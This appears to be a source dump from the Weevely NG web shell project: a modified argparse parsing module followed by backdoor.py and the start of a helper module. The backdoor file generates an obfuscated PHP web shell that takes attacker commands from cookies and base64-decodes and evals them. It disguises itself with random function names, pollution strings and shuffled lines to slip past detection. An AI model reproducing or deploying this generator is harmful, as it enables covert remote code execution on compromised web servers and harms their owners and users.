            if group.title in title_group_map:
                msg = _('cannot merge actions - two groups are named %r')
                raise ValueError(msg % (group.title))
            title_group_map[group.title] = group

        # map each action to its group
        group_map = {}
        for group in container._action_groups:

            # if a group with the title exists, use that, otherwise
            # create a new group matching the container's group
            if group.title not in title_group_map:
                title_group_map[group.title] = self.add_argument_group(
                    title=group.title,
                    description=group.description,
                    conflict_handler=group.conflict_handler)

            # map the actions to their new group
            for action in group._group_actions:
                group_map[action] = title_group_map[group.title]

        # add container's mutually exclusive groups
        # NOTE: if add_mutually_exclusive_group ever gains title= and
        # description= then this code will need to be expanded as above
        for group in container._mutually_exclusive_groups:
            mutex_group = self.add_mutually_exclusive_group(
                required=group.required)

            # map the actions to their new mutex group
            for action in group._group_actions:
                group_map[action] = mutex_group

        # add all actions to this container or their group
        for action in container._actions:
            group_map.get(action, self)._add_action(action)

    def _get_positional_kwargs(self, dest, **kwargs):
        # make sure required is not specified
        if 'required' in kwargs:
            msg = _("'required' is an invalid argument for positionals")
            raise TypeError(msg)

        # mark positional arguments as required if at least one is
        # always required
        if kwargs.get('nargs') not in [OPTIONAL, ZERO_OR_MORE]:
            kwargs['required'] = True
        if kwargs.get('nargs') == ZERO_OR_MORE and 'default' not in kwargs:
            kwargs['required'] = True

        # return the keyword arguments with no option strings
        return dict(kwargs, dest=dest, option_strings=[])

    def _get_optional_kwargs(self, *args, **kwargs):
        # determine short and long option strings
        option_strings = []
        long_option_strings = []
        for option_string in args:
            # error on strings that don't start with an appropriate prefix
            if not option_string[0] in self.prefix_chars:
                msg = _('invalid option string %r: '
                        'must start with a character %r')
                tup = option_string, self.prefix_chars
                raise ValueError(msg % tup)

            # strings starting with two prefix characters are long options
            option_strings.append(option_string)
            if option_string[0] in self.prefix_chars:
                if len(option_string) > 1:
                    if option_string[1] in self.prefix_chars:
                        long_option_strings.append(option_string)

        # infer destination, '--foo-bar' -> 'foo_bar' and '-x' -> 'x'
        dest = kwargs.pop('dest', None)
        if dest is None:
            if long_option_strings:
                dest_option_string = long_option_strings[0]
            else:
                dest_option_string = option_strings[0]
            dest = dest_option_string.lstrip(self.prefix_chars)
            if not dest:
                msg = _('dest= is required for options like %r')
                raise ValueError(msg % option_string)
            dest = dest.replace('-', '_')

        # return the updated keyword arguments
        return dict(kwargs, dest=dest, option_strings=option_strings)

    def _pop_action_class(self, kwargs, default=None):
        action = kwargs.pop('action', default)
        return self._registry_get('action', action, action)

    def _get_handler(self):
        # determine function from conflict handler string
        handler_func_name = '_handle_conflict_%s' % self.conflict_handler
        try:
            return getattr(self, handler_func_name)
        except AttributeError:
            msg = _('invalid conflict_resolution value: %r')
            raise ValueError(msg % self.conflict_handler)

    def _check_conflict(self, action):

        # find all options that conflict with this option
        confl_optionals = []
        for option_string in action.option_strings:
            if option_string in self._option_string_actions:
                confl_optional = self._option_string_actions[option_string]
                confl_optionals.append((option_string, confl_optional))

        # resolve any conflicts
        if confl_optionals:
            conflict_handler = self._get_handler()
            conflict_handler(action, confl_optionals)

    def _handle_conflict_error(self, action, conflicting_actions):
        message = _('conflicting option string(s): %s')
        conflict_string = ', '.join([option_string
                                     for option_string, action
                                     in conflicting_actions])
        raise ArgumentError(action, message % conflict_string)

    def _handle_conflict_resolve(self, action, conflicting_actions):

        # remove all conflicting options
        for option_string, action in conflicting_actions:

            # remove the conflicting option
            action.option_strings.remove(option_string)
            self._option_string_actions.pop(option_string, None)

            # if the option now has no option string, remove it from the
            # container holding it
            if not action.option_strings:
                action.container._remove_action(action)


class _ArgumentGroup(_ActionsContainer):

    def __init__(self, container, title=None, description=None, **kwargs):
        # add any missing keyword arguments by checking the container
        update = kwargs.setdefault
        update('conflict_handler', container.conflict_handler)
        update('prefix_chars', container.prefix_chars)
        update('argument_default', container.argument_default)
        super_init = super(_ArgumentGroup, self).__init__
        super_init(description=description, **kwargs)

        # group attributes
        self.title = title
        self._group_actions = []

        # share most attributes with the container
        self._registries = container._registries
        self._actions = container._actions
        self._option_string_actions = container._option_string_actions
        self._defaults = container._defaults
        self._has_negative_number_optionals = \
            container._has_negative_number_optionals

    def _add_action(self, action):
        action = super(_ArgumentGroup, self)._add_action(action)
        self._group_actions.append(action)
        return action

    def _remove_action(self, action):
        super(_ArgumentGroup, self)._remove_action(action)
        self._group_actions.remove(action)


class _MutuallyExclusiveGroup(_ArgumentGroup):

    def __init__(self, container, required=False):
        super(_MutuallyExclusiveGroup, self).__init__(container)
        self.required = required
        self._container = container

    def _add_action(self, action):
        if action.required:
            msg = _('mutually exclusive arguments must be optional')
            raise ValueError(msg)
        action = self._container._add_action(action)
        self._group_actions.append(action)
        return action

    def _remove_action(self, action):
        self._container._remove_action(action)
        self._group_actions.remove(action)


class ArgumentParser(_AttributeHolder, _ActionsContainer):
    """Object for parsing command line strings into Python objects.

    Keyword Arguments:
        - prog -- The name of the program (default: sys.argv[0])
        - usage -- A usage message (default: auto-generated from arguments)
        - description -- A description of what the program does
        - epilog -- Text following the argument descriptions
        - parents -- Parsers whose arguments should be copied into this one
        - formatter_class -- HelpFormatter class for printing help messages
        - prefix_chars -- Characters that prefix optional arguments
        - fromfile_prefix_chars -- Characters that prefix files containing
            additional arguments
        - argument_default -- The default value for all arguments
        - conflict_handler -- String indicating how to handle conflicts
        - add_help -- Add a -h/-help option
    """

    def __init__(self,
                 prog=None,
                 usage=None,
                 description=None,
                 epilog=None,
                 version=None,
                 parents=[],
                 formatter_class=HelpFormatter,
                 prefix_chars='-',
                 fromfile_prefix_chars=None,
                 argument_default=None,
                 conflict_handler='error',
                 add_help=True):

        if version is not None:
            import warnings
            warnings.warn(
                """The "version" argument to ArgumentParser is deprecated. """
                """Please use """
                """"add_argument(..., action='version', version="N", ...)" """
                """instead""", DeprecationWarning)

        superinit = super(ArgumentParser, self).__init__
        superinit(description=description,
                  prefix_chars=prefix_chars,
                  argument_default=argument_default,
                  conflict_handler=conflict_handler)

        # default setting for prog
        if prog is None:
            prog = _os.path.basename(_sys.argv[0])

        self.prog = prog
        self.usage = usage
        self.epilog = epilog
        self.version = version
        self.formatter_class = formatter_class
        self.fromfile_prefix_chars = fromfile_prefix_chars
        self.add_help = add_help

        add_group = self.add_argument_group
        self._positionals = add_group(_('positional arguments'))
        self._optionals = add_group(_('optional arguments'))
        self._subparsers = None

        # register types
        def identity(string):
            return string
        self.register('type', None, identity)

        # add help and version arguments if necessary
        # (using explicit default to override global argument_default)
        if '-' in prefix_chars:
            default_prefix = '-'
        else:
            default_prefix = prefix_chars[0]
        if self.add_help:
            self.add_argument(
                default_prefix+'h', default_prefix*2+'help',
                action='help', default=SUPPRESS,
                help=_('show this help message and exit'))
        if self.version:
            self.add_argument(
                default_prefix+'v', default_prefix*2+'version',
                action='version', default=SUPPRESS,
                version=self.version,
                help=_("show program's version number and exit"))

        # add parent arguments and defaults
        for parent in parents:
            self._add_container_actions(parent)
            try:
                defaults = parent._defaults
            except AttributeError:
                pass
            else:
                self._defaults.update(defaults)

    # =======================
    # Pretty __repr__ methods
    # =======================
    def _get_kwargs(self):
        names = [
            'prog',
            'usage',
            'description',
            'version',
            'formatter_class',
            'conflict_handler',
            'add_help',
        ]
        return [(name, getattr(self, name)) for name in names]

    # ==================================
    # Optional/Positional adding methods
    # ==================================
    def add_subparsers(self, **kwargs):
        if self._subparsers is not None:
            self.error(_('cannot have multiple subparser arguments'))

        # add the parser class to the arguments if it's not present
        kwargs.setdefault('parser_class', type(self))

        if 'title' in kwargs or 'description' in kwargs:
            title = _(kwargs.pop('title', 'subcommands'))
            description = _(kwargs.pop('description', None))
            self._subparsers = self.add_argument_group(title, description)
        else:
            self._subparsers = self._positionals

        # prog defaults to the usage message of this parser, skipping
        # optional arguments and with no "usage:" prefix
        if kwargs.get('prog') is None:
            formatter = self._get_formatter()
            positionals = self._get_positional_actions()
            groups = self._mutually_exclusive_groups
            formatter.add_usage(self.usage, positionals, groups, '')
            kwargs['prog'] = formatter.format_help().strip()

        # create the parsers action and add it to the positionals list
        parsers_class = self._pop_action_class(kwargs, 'parsers')
        action = parsers_class(option_strings=[], **kwargs)
        self._subparsers._add_action(action)

        # return the created parsers action
        return action

    def _add_action(self, action):
        if action.option_strings:
            self._optionals._add_action(action)
        else:
            self._positionals._add_action(action)
        return action

    def _get_optional_actions(self):
        return [action
                for action in self._actions
                if action.option_strings]

    def _get_positional_actions(self):
        return [action
                for action in self._actions
                if not action.option_strings]

    # =====================================
    # Command line argument parsing methods
    # =====================================
    def parse_args(self, args=None, namespace=None):
        args, argv = self.parse_known_args(args, namespace)
        if argv:
            msg = _('unrecognized arguments: %s')
            self.error(msg % ' '.join(argv))
        return args

    def parse_known_args(self, args=None, namespace=None):
        # args default to the system args
        if args is None:
            args = _sys.argv[1:]

        # default Namespace built from parser defaults
        if namespace is None:
            namespace = Namespace()

        # add any action defaults that aren't present
        for action in self._actions:
            if action.dest is not SUPPRESS:
                if not hasattr(namespace, action.dest):
                    if action.default is not SUPPRESS:
                        default = action.default
                        if isinstance(action.default, basestring):
                            default = self._get_value(action, default)
                        setattr(namespace, action.dest, default)

        # add any parser defaults that aren't present
        for dest in self._defaults:
            if not hasattr(namespace, dest):
                setattr(namespace, dest, self._defaults[dest])

        # parse the arguments and exit if there are any errors
        try:
            namespace, args = self._parse_known_args(args, namespace)
            if hasattr(namespace, _UNRECOGNIZED_ARGS_ATTR):
                args.extend(getattr(namespace, _UNRECOGNIZED_ARGS_ATTR))
                delattr(namespace, _UNRECOGNIZED_ARGS_ATTR)
            return namespace, args
        except ArgumentError:
            err = _sys.exc_info()[1]
            self.error(str(err))

    def _parse_known_args(self, arg_strings, namespace):
        # replace arg strings that are file references
        if self.fromfile_prefix_chars is not None:
            arg_strings = self._read_args_from_files(arg_strings)

        # map all mutually exclusive arguments to the other arguments
        # they can't occur with
        action_conflicts = {}
        for mutex_group in self._mutually_exclusive_groups:
            group_actions = mutex_group._group_actions
            for i, mutex_action in enumerate(mutex_group._group_actions):
                conflicts = action_conflicts.setdefault(mutex_action, [])
                conflicts.extend(group_actions[:i])
                conflicts.extend(group_actions[i + 1:])

        # find all option indices, and determine the arg_string_pattern
        # which has an 'O' if there is an option at an index,
        # an 'A' if there is an argument, or a '-' if there is a '--'
        option_string_indices = {}
        arg_string_pattern_parts = []
        arg_strings_iter = iter(arg_strings)
        for i, arg_string in enumerate(arg_strings_iter):

            # all args after -- are non-options
            if arg_string == '--':
                arg_string_pattern_parts.append('-')
                for arg_string in arg_strings_iter:
                    arg_string_pattern_parts.append('A')

            # otherwise, add the arg to the arg strings
            # and note the index if it was an option
            else:
                option_tuple = self._parse_optional(arg_string)
                if option_tuple is None:
                    pattern = 'A'
                else:
                    option_string_indices[i] = option_tuple
                    pattern = 'O'
                arg_string_pattern_parts.append(pattern)

        # join the pieces together to form the pattern
        arg_strings_pattern = ''.join(arg_string_pattern_parts)

        # converts arg strings to the appropriate and then takes the action
        seen_actions = set()
        seen_non_default_actions = set()

        def take_action(action, argument_strings, option_string=None):
            seen_actions.add(action)
            argument_values = self._get_values(action, argument_strings)

            # error if this argument is not allowed with other previously
            # seen arguments, assuming that actions that use the default
            # value don't really count as "present"
            if argument_values is not action.default:
                seen_non_default_actions.add(action)
                for conflict_action in action_conflicts.get(action, []):
                    if conflict_action in seen_non_default_actions:
                        msg = _('not allowed with argument %s')
                        action_name = _get_action_name(conflict_action)
                        raise ArgumentError(action, msg % action_name)

            # take the action if we didn't receive a SUPPRESS value
            # (e.g. from a default)
            if argument_values is not SUPPRESS:
                action(self, namespace, argument_values, option_string)

        # function to convert arg_strings into an optional action
        def consume_optional(start_index):

            # get the optional identified at this index
            option_tuple = option_string_indices[start_index]
            action, option_string, explicit_arg = option_tuple

            # identify additional optionals in the same arg string
            # (e.g. -xyz is the same as -x -y -z if no args are required)
            match_argument = self._match_argument
            action_tuples = []
            while True:

                # if we found no optional action, skip it
                if action is None:
                    extras.append(arg_strings[start_index])
                    return start_index + 1

                # if there is an explicit argument, try to match the
                # optional's string arguments to only this
                if explicit_arg is not None:
                    arg_count = match_argument(action, 'A')

                    # if the action is a single-dash option and takes no
                    # arguments, try to parse more single-dash options out
                    # of the tail of the option string
                    chars = self.prefix_chars
                    if arg_count == 0 and option_string[1] not in chars:
                        action_tuples.append((action, [], option_string))
                        char = option_string[0]
                        option_string = char + explicit_arg[0]
                        new_explicit_arg = explicit_arg[1:] or None
                        optionals_map = self._option_string_actions
                        if option_string in optionals_map:
                            action = optionals_map[option_string]
                            explicit_arg = new_explicit_arg
                        else:
                            msg = _('ignored explicit argument %r')
                            raise ArgumentError(action, msg % explicit_arg)

                    # if the action expect exactly one argument, we've
                    # successfully matched the option; exit the loop
                    elif arg_count == 1:
                        stop = start_index + 1
                        args = [explicit_arg]
                        action_tuples.append((action, args, option_string))
                        break

                    # error if a double-dash option did not use the
                    # explicit argument
                    else:
                        msg = _('ignored explicit argument %r')
                        raise ArgumentError(action, msg % explicit_arg)

                # if there is no explicit argument, try to match the
                # optional's string arguments with the following strings
                # if successful, exit the loop
                else:
                    start = start_index + 1
                    selected_patterns = arg_strings_pattern[start:]
                    arg_count = match_argument(action, selected_patterns)
                    stop = start + arg_count
                    args = arg_strings[start:stop]
                    action_tuples.append((action, args, option_string))
                    break

            # add the Optional to the list and return the index at which
            # the Optional's string args stopped
            assert action_tuples
            for action, args, option_string in action_tuples:
                take_action(action, args, option_string)
            return stop

        # the list of Positionals left to be parsed; this is modified
        # by consume_positionals()
        positionals = self._get_positional_actions()

        # function to convert arg_strings into positional actions
        def consume_positionals(start_index):
            # match as many Positionals as possible
            match_partial = self._match_arguments_partial
            selected_pattern = arg_strings_pattern[start_index:]
            arg_counts = match_partial(positionals, selected_pattern)

            # slice off the appropriate arg strings for each Positional
            # and add the Positional and its args to the list
            for action, arg_count in zip(positionals, arg_counts):
                args = arg_strings[start_index: start_index + arg_count]
                start_index += arg_count
                take_action(action, args)

            # slice off the Positionals that we just parsed and return the
            # index at which the Positionals' string args stopped
            positionals[:] = positionals[len(arg_counts):]
            return start_index

        # consume Positionals and Optionals alternately, until we have
        # passed the last option string
        extras = []
        start_index = 0
        if option_string_indices:
            max_option_string_index = max(option_string_indices)
        else:
            max_option_string_index = -1
        while start_index <= max_option_string_index:

            # consume any Positionals preceding the next option
            next_option_string_index = min([
                index
                for index in option_string_indices
                if index >= start_index])
            if start_index != next_option_string_index:
                positionals_end_index = consume_positionals(start_index)

                # only try to parse the next optional if we didn't consume
                # the option string during the positionals parsing
                if positionals_end_index > start_index:
                    start_index = positionals_end_index
                    continue
                else:
                    start_index = positionals_end_index

            # if we consumed all the positionals we could and we're not
            # at the index of an option string, there were extra arguments
            if start_index not in option_string_indices:
                strings = arg_strings[start_index:next_option_string_index]
                extras.extend(strings)
                start_index = next_option_string_index

            # consume the next optional and any arguments for it
            start_index = consume_optional(start_index)

        # consume any positionals following the last Optional
        stop_index = consume_positionals(start_index)

        # if we didn't consume all the argument strings, there were extras
        extras.extend(arg_strings[stop_index:])

        # if we didn't use all the Positional objects, there were too few
        # arg strings supplied.
        if positionals:
            if not hasattr(namespace, 'stored') or getattr(namespace, 'stored') == False: self.error(_('too few arguments'))

        # make sure all required actions were present
        for action in self._actions:
            if action.required:
                if action not in seen_actions:
                    name = _get_action_name(action)
                    if not hasattr(namespace, 'stored'): self.error(_('argument %s is required') % name)

        # make sure all required groups had one option present
        for group in self._mutually_exclusive_groups:
            if group.required:
                for action in group._group_actions:
                    if action in seen_non_default_actions:
                        break

                # if no actions were used, report the error
                else:
                    names = [_get_action_name(action)
                             for action in group._group_actions
                             if action.help is not SUPPRESS]
                    msg = _('one of the arguments %s is required')
                    if not hasattr(namespace, 'stored'): self.error(msg % ' '.join(names))

        # return the updated namespace and the extra arguments
        return namespace, extras

    def _read_args_from_files(self, arg_strings):
        # expand arguments referencing files
        new_arg_strings = []
        for arg_string in arg_strings:

            # for regular arguments, just add them back into the list
            if arg_string[0] not in self.fromfile_prefix_chars:
                new_arg_strings.append(arg_string)

            # replace arguments referencing files with the file content
            else:
                try:
                    args_file = open(arg_string[1:])
                    try:
                        arg_strings = []
                        for arg_line in args_file.read().splitlines():
                            for arg in self.convert_arg_line_to_args(arg_line):
                                arg_strings.append(arg)
                        arg_strings = self._read_args_from_files(arg_strings)
                        new_arg_strings.extend(arg_strings)
                    finally:
                        args_file.close()
                except IOError:
                    err = _sys.exc_info()[1]
                    self.error(str(err))

        # return the modified argument list
        return new_arg_strings

    def convert_arg_line_to_args(self, arg_line):
        return [arg_line]

    def _match_argument(self, action, arg_strings_pattern):
        # match the pattern for this action to the arg strings
        nargs_pattern = self._get_nargs_pattern(action)
        match = _re.match(nargs_pattern, arg_strings_pattern)

        # raise an exception if we weren't able to find a match
        if match is None:
            nargs_errors = {
                None: _('expected one argument'),
                OPTIONAL: _('expected at most one argument'),
                ONE_OR_MORE: _('expected at least one argument'),
            }
            default = _('expected %s argument(s)') % action.nargs
            msg = nargs_errors.get(action.nargs, default)
            raise ArgumentError(action, msg)

        # return the number of arguments matched
        return len(match.group(1))

    def _match_arguments_partial(self, actions, arg_strings_pattern):
        # progressively shorten the actions list by slicing off the
        # final actions until we find a match
        result = []
        for i in range(len(actions), 0, -1):
            actions_slice = actions[:i]
            pattern = ''.join([self._get_nargs_pattern(action)
                               for action in actions_slice])
            match = _re.match(pattern, arg_strings_pattern)
            if match is not None:
                result.extend([len(string) for string in match.groups()])
                break

        # return the list of arg string counts
        return result

    def _parse_optional(self, arg_string):
        # if it's an empty string, it was meant to be a positional
        if not arg_string:
            return None

        # if it doesn't start with a prefix, it was meant to be positional
        if not arg_string[0] in self.prefix_chars:
            return None

        # if the option string is present in the parser, return the action
        if arg_string in self._option_string_actions:
            action = self._option_string_actions[arg_string]
            return action, arg_string, None

        # if it's just a single character, it was meant to be positional
        if len(arg_string) == 1:
            return None

        # if the option string before the "=" is present, return the action
        if '=' in arg_string:
            option_string, explicit_arg = arg_string.split('=', 1)
            if option_string in self._option_string_actions:
                action = self._option_string_actions[option_string]
                return action, option_string, explicit_arg

        # search through all possible prefixes of the option string
        # and all actions in the parser for possible interpretations
        option_tuples = self._get_option_tuples(arg_string)

        # if multiple actions match, the option string was ambiguous
        if len(option_tuples) > 1:
            options = ', '.join([option_string
                for action, option_string, explicit_arg in option_tuples])
            tup = arg_string, options
            self.error(_('ambiguous option: %s could match %s') % tup)

        # if exactly one action matched, this segmentation is good,
        # so return the parsed action
        elif len(option_tuples) == 1:
            option_tuple, = option_tuples
            return option_tuple

        # if it was not found as an option, but it looks like a negative
        # number, it was meant to be positional
        # unless there are negative-number-like options
        if self._negative_number_matcher.match(arg_string):
            if not self._has_negative_number_optionals:
                return None

        # if it contains a space, it was meant to be a positional
        if ' ' in arg_string:
            return None

        # it was meant to be an optional but there is no such option
        # in this parser (though it might be a valid option in a subparser)
        return None, arg_string, None

    def _get_option_tuples(self, option_string):
        result = []

        # option strings starting with two prefix characters are only
        # split at the '='
        chars = self.prefix_chars
        if option_string[0] in chars and option_string[1] in chars:
            if '=' in option_string:
                option_prefix, explicit_arg = option_string.split('=', 1)
            else:
                option_prefix = option_string
                explicit_arg = None
            for option_string in self._option_string_actions:
                if option_string.startswith(option_prefix):
                    action = self._option_string_actions[option_string]
                    tup = action, option_string, explicit_arg
                    result.append(tup)

        # single character options can be concatenated with their arguments
        # but multiple character options always have to have their argument
        # separate
        elif option_string[0] in chars and option_string[1] not in chars:
            option_prefix = option_string
            explicit_arg = None
            short_option_prefix = option_string[:2]
            short_explicit_arg = option_string[2:]

            for option_string in self._option_string_actions:
                if option_string == short_option_prefix:
                    action = self._option_string_actions[option_string]
                    tup = action, option_string, short_explicit_arg
                    result.append(tup)
                elif option_string.startswith(option_prefix):
                    action = self._option_string_actions[option_string]
                    tup = action, option_string, explicit_arg
                    result.append(tup)

        # shouldn't ever get here
        else:
            self.error(_('unexpected option string: %s') % option_string)

        # return the collected option tuples
        return result

    def _get_nargs_pattern(self, action):
        # in all examples below, we have to allow for '--' args
        # which are represented as '-' in the pattern
        nargs = action.nargs

        # the default (None) is assumed to be a single argument
        if nargs is None:
            nargs_pattern = '(-*A-*)'

        # allow zero or one arguments
        elif nargs == OPTIONAL:
            nargs_pattern = '(-*A?-*)'

        # allow zero or more arguments
        elif nargs == ZERO_OR_MORE:
            nargs_pattern = '(-*[A-]*)'

        # allow one or more arguments
        elif nargs == ONE_OR_MORE:
            nargs_pattern = '(-*A[A-]*)'

        # allow any number of options or arguments
        elif nargs == REMAINDER:
            nargs_pattern = '([-AO]*)'

        # allow one argument followed by any number of options or arguments
        elif nargs == PARSER:
            nargs_pattern = '(-*A[-AO]*)'

        # all others should be integers
        else:
            nargs_pattern = '(-*%s-*)' % '-*'.join('A' * nargs)

        # if this is an optional action, -- is not allowed
        if action.option_strings:
            nargs_pattern = nargs_pattern.replace('-*', '')
            nargs_pattern = nargs_pattern.replace('-', '')

        # return the pattern
        return nargs_pattern

    # ========================
    # Value conversion methods
    # ========================
    def _get_values(self, action, arg_strings):
        # for everything but PARSER args, strip out '--'
        if action.nargs not in [PARSER, REMAINDER]:
            arg_strings = [s for s in arg_strings if s != '--']

        # optional argument produces a default when not present
        if not arg_strings and action.nargs == OPTIONAL:
            if action.option_strings:
                value = action.const
            else:
                value = action.default
            if isinstance(value, basestring):
                value = self._get_value(action, value)
                self._check_value(action, value)

        # when nargs='*' on a positional, if there were no command-line
        # args, use the default if it is anything other than None
        elif (not arg_strings and action.nargs == ZERO_OR_MORE and
              not action.option_strings):
            if action.default is not None:
                value = action.default
            else:
                value = arg_strings
            self._check_value(action, value)

        # single argument or optional argument produces a single value
        elif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:
            arg_string, = arg_strings
            value = self._get_value(action, arg_string)
            self._check_value(action, value)

        # REMAINDER arguments convert all values, checking none
        elif action.nargs == REMAINDER:
            value = [self._get_value(action, v) for v in arg_strings]

        # PARSER arguments convert all values, but check only the first
        elif action.nargs == PARSER:
            value = [self._get_value(action, v) for v in arg_strings]
            self._check_value(action, value[0])

        # all other types of nargs produce a list
        else:
            value = [self._get_value(action, v) for v in arg_strings]
            for v in value:
                self._check_value(action, v)

        # return the converted value
        return value

    def _get_value(self, action, arg_string):
        type_func = self._registry_get('type', action.type, action.type)
        if not _callable(type_func):
            msg = _('%r is not callable')
            raise ArgumentError(action, msg % type_func)

        # convert the value to the appropriate type
        try:
            if not arg_string:
                raise ValueError("Empty value")
            elif type_func.__name__ != 'identity':
                result = type_func(literal_eval(arg_string))
            else:
                result = type_func(arg_string)

        # ArgumentTypeErrors indicate errors
        except ArgumentTypeError:
            name = getattr(action.type, '__name__', repr(action.type))
            msg = str(_sys.exc_info()[1])
            raise ArgumentError(action, msg)

        # TypeErrors or ValueErrors also indicate errors
        except (TypeError, ValueError):
            name = getattr(action.type, '__name__', repr(action.type))
            msg = _('invalid %s value: %r')
            raise ArgumentError(action, msg % (name, arg_string))

        # return the converted value
        return result

    def _check_value(self, action, value):
        # converted value must be one of the choices (if specified)
        if action.choices is not None and value not in action.choices:
            tup = value, ', '.join(map(repr, action.choices))
            msg = _('invalid choice: %r (choose from %s)') % tup
            raise ArgumentError(action, msg)

    # =======================
    # Help-formatting methods
    # =======================
    def format_usage(self):
        formatter = self._get_formatter()
        formatter.add_usage(self.usage, self._actions,
                            self._mutually_exclusive_groups)
        return formatter.format_help()

    def format_help(self):
        formatter = self._get_formatter()

        # usage
        formatter.add_usage(self.usage, self._actions,
                            self._mutually_exclusive_groups)

        # description
        formatter.add_text(self.description)

        # positionals, optionals and user-defined groups
        for action_group in self._action_groups:
            formatter.start_section(action_group.title)
            formatter.add_text(action_group.description)
            formatter.add_arguments(action_group._group_actions)
            formatter.end_section()

        # epilog
        formatter.add_text(self.epilog)

        # determine help from format above
        return formatter.format_help()

    def format_version(self):
        import warnings
        warnings.warn(
            'The format_version method is deprecated -- the "version" '
            'argument to ArgumentParser is no longer supported.',
            DeprecationWarning)
        formatter = self._get_formatter()
        formatter.add_text(self.version)
        return formatter.format_help()

    def _get_formatter(self):
        return self.formatter_class(prog=self.prog)

    # =====================
    # Help-printing methods
    # =====================
    def print_usage(self, file=None):
        if file is None:
            file = _sys.stdout
        self._print_message(self.format_usage(), file)

    def print_help(self, file=None):
        if file is None:
            file = _sys.stdout
        #self._print_message(self.format_help(), file)

    def print_version(self, file=None):
        import warnings
        warnings.warn(
            'The print_version method is deprecated -- the "version" '
            'argument to ArgumentParser is no longer supported.',
            DeprecationWarning)
        self._print_message(self.format_version(), file)

    def _print_message(self, message, file=None):
        if message:
            if file is None:
                file = _sys.stderr
            file.write(message)

    # ===============
    # Exiting methods
    # ===============
    def exit(self, status=0, message=None):
        pass

    def error(self, message):
        """error(message: string)

        Prints a usage message incorporating the message to stderr and
        exits.

        If you override this in a subclass, it should not return -- it
        should either exit or raise an exception.
        """
        self.print_usage()
        raise ModuleException(self.prog[1:], message + '. Run \':help %s\' for help.' % self.prog[1:])

########NEW FILE########
__FILENAME__ = backdoor
# -*- coding: utf-8 -*-
# This file is part of Weevely NG.
#
# Copyright(c) 2011-2012 Weevely Developers
# http://code.google.com/p/weevely/
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

import base64, codecs
from random import random, randrange, choice, shuffle
from pollution import pollute_with_static_str
from core.utils import randstr
from core.moduleexception import ModuleException
from string import Template, ascii_letters, digits

PERMITTED_CHARS = ascii_letters + digits + '_.~'

WARN_SHORT_PWD = 'Invalid password, use words longer than 3 characters'
WARN_CHARS = 'Invalid password, password permitted chars are \'%s\'' % PERMITTED_CHARS

class BdTemplate(Template):
    delimiter = '%'

class Backdoor:

    payload_template= """
$c='count';
$a=$_COOKIE;
if(reset($a)=='%STARTKEY' && $c($a)>3){
$k='%ENDKEY';
echo '<'.$k.'>';
eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
echo '</'.$k.'>';
}
"""

    backdoor_template = """<?php
$%PAY_VAR1="%PAY1";
$%PAY_VAR2="%PAY2";
$%PAY_VAR3="%PAY3";
$%PAY_VAR4="%PAY4";
$%REPL_FUNC = str_replace("%REPL_POLL","","%REPL_ENC");
$%B64_FUNC = $%REPL_FUNC("%B64_POLL", "", "%B64_ENC");
$%CREAT_FUNC = $%REPL_FUNC("%CREAT_POLL","","%CREAT_ENC");
$%FINAL_FUNC = $%CREAT_FUNC('', $%B64_FUNC($%REPL_FUNC("%PAY_POLL", "", $%PAY_VAR1.$%PAY_VAR2.$%PAY_VAR3.$%PAY_VAR4))); $%FINAL_FUNC();
?>"""


    def __init__( self, password ):

        self.__check_pwd(password)
        
        self.password  = password
        self.start_key = self.password[:2]
        self.end_key   = self.password[2:]
        self.payload = BdTemplate(self.payload_template).substitute(STARTKEY = self.start_key, ENDKEY = self.end_key).replace( '\n', '' )
        
        self.backdoor  = self.encode_template()
        
    def __str__( self ):
		return self.backdoor
        
    def __check_pwd(self, password):
        
        if len(password)<4:
            raise ModuleException('generate','\'%s\' %s' % (password, WARN_SHORT_PWD))   

        if ''.join(c for c in password if c not in PERMITTED_CHARS):
            raise ModuleException('generate','\'%s\' %s' % (password, WARN_CHARS))   

    def encode_template(self):
    	
    	b64_new_func_name = randstr()
    	b64_pollution, b64_polluted = pollute_with_static_str('base64_decode',frequency=0.7)
    	
    	createfunc_name = randstr()
    	createfunc_pollution, createfunc_polluted = pollute_with_static_str('create_function',frequency=0.7)
    	
    	payload_var = [ randstr() for st in range(4) ]
    	payload_pollution, payload_polluted = pollute_with_static_str(base64.b64encode(self.payload))
    	
    	replace_new_func_name = randstr()
    	repl_pollution, repl_polluted = pollute_with_static_str('str_replace',frequency=0.7)
    	
    	final_func_name = randstr()
    	
    	length  = len(payload_polluted)
    	offset = 7
    	piece1	= length / 4 + randrange(-offset,+offset)
    	piece2  = length / 2 + randrange(-offset,+offset)
    	piece3  = length*3/4 + randrange(-offset,+offset)
    	
    	ts_splitted = self.backdoor_template.splitlines()
    	ts_shuffled = ts_splitted[1:6]
    	shuffle(ts_shuffled)
    	ts_splitted = [ts_splitted[0]] + ts_shuffled + ts_splitted[6:]
    	self.backdoor_template = '\n'.join(ts_splitted)
    	
    	return BdTemplate(self.backdoor_template).substitute(
				B64_FUNC = b64_new_func_name,
				B64_ENC = b64_polluted, 
				B64_POLL = b64_pollution,
				CREAT_FUNC = createfunc_name,
				CREAT_ENC = createfunc_polluted,
				CREAT_POLL = createfunc_pollution,
				REPL_FUNC = replace_new_func_name,
				REPL_ENC = repl_polluted,
				REPL_POLL = repl_pollution,
				PAY_VAR1 = payload_var[0],
				PAY_VAR2 = payload_var[1],
				PAY_VAR3 = payload_var[2],
				PAY_VAR4 = payload_var[3],
				PAY_POLL = payload_pollution, 
				PAY1 = payload_polluted[:piece1],
				PAY2 = payload_polluted[piece1:piece2],
				PAY3 = payload_polluted[piece2:piece3],
				PAY4 = payload_polluted[piece3:],
				FINAL_FUNC = final_func_name)

    		

########NEW FILE########
__FILENAME__ = helper
from core.prettytable import PrettyTable
import os


class Helper:
    
    def _format_presentation(self):
        
        return (os.linesep + '[+] ').join([banner, 'Browse filesystem, execute commands or list available modules with \':help\'', self.modhandler.sessions.format_sessions()]) + os.linesep
    
    def _format_grouped_helps(self, oneline=False):
        
        table_module = PrettyTable(['module', 'description'])
